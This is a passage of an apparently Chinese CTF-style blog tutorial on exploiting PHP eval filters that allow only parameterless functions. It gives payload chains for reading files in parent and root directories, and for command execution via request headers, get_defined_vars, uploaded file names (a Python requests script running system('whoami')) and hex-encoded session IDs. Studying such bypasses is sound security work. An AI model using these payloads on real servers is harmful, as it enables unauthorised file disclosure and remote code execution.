+</code></pre></td></tr></table>
+</div>
+</div><h3 id="读取上级目录文件">读取上级目录文件</h3>
+<p>直接<code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p>
+<p>前面写到了<code>chdir()</code>，使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
+</code></pre></td></tr></table>
+</div>
+</div><p>即可改变当前目录为上一层目录并读取文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628224546609.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628224546609.png, https://gitee.com/leonsec/images/raw/master/image-20200628224546609.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628224546609.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628224546609.png"
+        title="image-20200628224546609" /></p>
+<p>如果不能使用<code>dirname()</code>，可以使用构造<code>&quot;..&quot;</code>的方式切换路径并读取：</p>
+<p>但是这里切换路径后<code>getcwd()</code>和<code>localeconv()</code>不能接收参数，因为语法不允许，我们可以用之前的<code>hebrevc(crypt(arg))</code></p>
+<p>这里<code>crypt()</code>和<code>time()</code>可以接收参数，于是构造：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
+或更复杂的：
+show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
+还可以用：
+show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
+</code></pre></td></tr></table>
+</div>
+</div><p>多刷新几次：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628230002569.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628230002569.png, https://gitee.com/leonsec/images/raw/master/image-20200628230002569.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628230002569.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628230002569.png"
+        title="image-20200628230002569" /></p>
+<p>还有一种构造方法<code>if()</code>：（这种更直观些，并且不需要找可接收参数的函数）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628230706259.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628230706259.png, https://gitee.com/leonsec/images/raw/master/image-20200628230706259.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628230706259.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628230706259.png"
+        title="image-20200628230706259" /></p>
+<h3 id="查看和读取多层上级路径的就不写了一样的方式套娃就行">查看和读取多层上级路径的就不写了，一样的方式套娃就行</h3>
+<h3 id="查看和读取根目录文件">查看和读取根目录文件</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+</code></pre></td></tr></table>
+</div>
+</div><p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code>，所以使用以上payload可以查看根目录文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628235757875.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628235757875.png, https://gitee.com/leonsec/images/raw/master/image-20200628235757875.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628235757875.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628235757875.png"
+        title="image-20200628235757875" /></p>
+<p>但是有权限限制，linux系统下需要一定的权限才能读到，所以不一定成功</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628235933547.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628235933547.png, https://gitee.com/leonsec/images/raw/master/image-20200628235933547.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628235933547.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628235933547.png"
+        title="image-20200628235933547" /></p>
+<p>同样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));
+</code></pre></td></tr></table>
+</div>
+</div><p>也可以查看根目录文件，但是也会受到权限限制，不一定成功</p>
+<p>读根目录文件：(也是需要权限)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));
+</code></pre></td></tr></table>
+</div>
+</div><p>读文件暂时就写这么多，肯定还有许多函数可以达到相同效果，等待大佬的发掘吧</p>
+<h2 id="无参数命令执行rce">无参数命令执行(RCE)</h2>
+<p>我们可以使用无参数函数任意读文件，也可以执行命令：</p>
+<p>既然传入的<code>code</code>值不能含有参数，那我们可不可以把参数放在别的地方，<code>code</code>用无参数函数来接收参数呢？这样就可以打破无参数函数的限制：</p>
+<p>首先想到<code>headers</code>，因为<code>headers</code>我们用户可控，于是在PHP手册中搜索：<code>headers</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629104020490.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629104020490.png, https://gitee.com/leonsec/images/raw/master/image-20200629104020490.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629104020490.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629104020490.png"
+        title="image-20200629104020490" /></p>
+<p>经过查找，发现<code>getallheaders()</code>和<code>apache_request_headers()</code></p>
+<h3 id="getallheadersapache_request_headers">getallheaders()&amp;apache_request_headers()</h3>
+<p><code>getallheaders()</code>是<code>apache_request_headers()</code>的别名函数，但是该函数只能在<code>Apache</code>环境下使用</p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20200629104143966.png" alt="image-20200629104143966"  /></p>
+<p>接下来利用方式就多了，任何<code>header</code>头部都可利用：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629104752223.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629104752223.png, https://gitee.com/leonsec/images/raw/master/image-20200629104752223.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629104752223.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629104752223.png"
+        title="image-20200629104752223" /></p>
+<p>我们可以使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">?code=eval(pos(getallheaders()));
+//header
+Leon: phpinfo();
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629105346885.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629105346885.png, https://gitee.com/leonsec/images/raw/master/image-20200629105346885.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629105346885.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629105346885.png"
+        title="image-20200629105346885" /></p>
+<p>因为我这里<code>Leon: phpinfo();</code>排在第一位，所以直接用<code>pos(current的别名)</code>取第一个数组的值</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629105501994.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629105501994.png, https://gitee.com/leonsec/images/raw/master/image-20200629105501994.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629105501994.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629105501994.png"
+        title="image-20200629105501994" /></p>
+<p>当然，在系统函数没有禁用的情况下，我们还可以直接使用系统函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629105721092.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629105721092.png, https://gitee.com/leonsec/images/raw/master/image-20200629105721092.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629105721092.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629105721092.png"
+        title="image-20200629105721092" /></p>
+<p>根据位置的不同，可以结合前文，构造获取不同位置的数组</p>
+<p>除了可以获得<code>headers</code>，PHP有个函数可以获得所有PHP变量：</p>
+<h3 id="get_defined_vars">get_defined_vars()</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629110400151.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629110400151.png, https://gitee.com/leonsec/images/raw/master/image-20200629110400151.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629110400151.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629110400151.png"
+        title="image-20200629110400151" /></p>
+<p>该函数会返回全局变量的值，如get、post、cookie、file数据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629110734923.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629110734923.png, https://gitee.com/leonsec/images/raw/master/image-20200629110734923.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629110734923.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629110734923.png"
+        title="image-20200629110734923" /></p>
+<p>这里要注意，<code>leon=&gt;phpinfo();</code>在<code>_GET</code>数组中，所以需要使用两次取数组值：</p>
+<p>第一次：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629111043751.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629111043751.png, https://gitee.com/leonsec/images/raw/master/image-20200629111043751.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629111043751.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629111043751.png"
+        title="image-20200629111043751" /></p>
+<p>第二次：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629111115756.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629111115756.png, https://gitee.com/leonsec/images/raw/master/image-20200629111115756.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629111115756.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629111115756.png"
+        title="image-20200629111115756" /></p>
+<p>所以，利用get传递新变量可以造成命令执行，post、cookie同理，这里就不演示了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">?leon=phpinfo();<span class="ni">&amp;code=eval(pos(pos(get_defined_vars())));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629111149870.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629111149870.png, https://gitee.com/leonsec/images/raw/master/image-20200629111149870.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629111149870.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629111149870.png"
+        title="image-20200629111149870" /></p>
+<p>如何利用file变量进行rce呢？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
+<span class="p">}</span>
+<span class="c1">#data = {</span>
+<span class="c1">#&#34;code&#34;:&#34;eval(pos(pos(end(get_defined_vars()))));&#34;</span>
+<span class="c1">#}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里要注意的是，file数组在最后一个，需要end定位，因为payload直接放在文件的名称上，再pos两次定位获得文件名</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629114455027.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629114455027.png, https://gitee.com/leonsec/images/raw/master/image-20200629114455027.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629114455027.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629114455027.png"
+        title="image-20200629114455027" /></p>
+<h3 id="session_id">session_id()</h3>
+<p><code>session_id()</code>： 可以用来获取/设置 当前会话 ID。</p>
+<p>session需要使用<code>session_start()</code>开启，然后返回参数给<code>session_id()</code></p>
+<p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
+<p>但是<code>hex2bin()</code>函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用<code>hex2bin()</code>即可</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629122329855.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629122329855.png, https://gitee.com/leonsec/images/raw/master/image-20200629122329855.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629122329855.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629122329855.png"
+        title="image-20200629122329855" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629122228441.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629122228441.png, https://gitee.com/leonsec/images/raw/master/image-20200629122228441.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629122228441.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629122228441.png"
+        title="image-20200629122228441" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">eval(hex2bin(session_id(session_start())));
+
+&gt;&gt;&gt; print&#39;phpinfo();&#39;.encode(&#39;hex&#39;)
+706870696e666f28293b
+
+Cookie: PHPSESSID=706870696e666f28293b
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="getenv">getenv()</h3>
+<p><code>getenv()</code>  ：获取环境变量的值(在PHP7.1之后可以不给予参数)</p>
+<p>所以该函数只适用于PHP7.1之后版本，否则会出现：<code>Warning:  getenv() expects exactly 1 parameter, 0 given in ...</code>报错</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629094859023.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629094859023.png, https://gitee.com/leonsec/images/raw/master/image-20200629094859023.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629094859023.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629094859023.png"
+        title="image-20200629094859023" /></p>
+<p><code>getenv()</code> 可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的<code>php.ini</code>中，<code>variables_order</code>值为：<code>GPCS</code></p>
+<p>也就是说系统在定义PHP预定义变量时的顺序是 <code>GET,POST,COOKIES,SERVER</code>，没有定义<code>Environment(E)</code>，你可以修改<code>php.ini</code>文件的 <code>variables_order</code>值为你想要的顺序，如：<code>&quot;EGPCS&quot;</code>。这时，<code>$_ENV</code>的值就可以取得了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629102641877.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629102641877.png, https://gitee.com/leonsec/images/raw/master/image-20200629102641877.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629102641877.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629102641877.png"
+        title="image-20200629102641877" /></p>
+<p>我们来看修改后的值：（环境不同，环境变量显示也不同）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629103116139.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629103116139.png, https://gitee.com/leonsec/images/raw/master/image-20200629103116139.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629103116139.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629103116139.png"
+        title="image-20200629103116139" /></p>
+<p>对此我们可以加以利用，方法同上文：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200629103410082.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200629103410082.png, https://gitee.com/leonsec/images/raw/master/image-20200629103410082.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200629103410082.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200629103410082.png"
+        title="image-20200629103410082" /></p>
+<h2 id="小结">小结</h2>
+<p>无参数RCE和文件读取实际情况下会存在许多过滤，需要自己结合以上方法绕过，主要还是考察对PHP函数的熟练程度</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener noreffer">PHP Parametric Function RCE</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-07-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE" data-hashtags="RCE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/rce/">RCE</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" class="prev" rel="prev" title="又见反序列化逃逸(phpuns) Writeup"><i class="fas fa-angle-left fa-fw"></i>又见反序列化逃逸(phpuns) Writeup</a>
+            <a href="/htb-blunder-writeup/" class="next" rel="next" title="HTB Blunder Writeup">HTB Blunder Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png",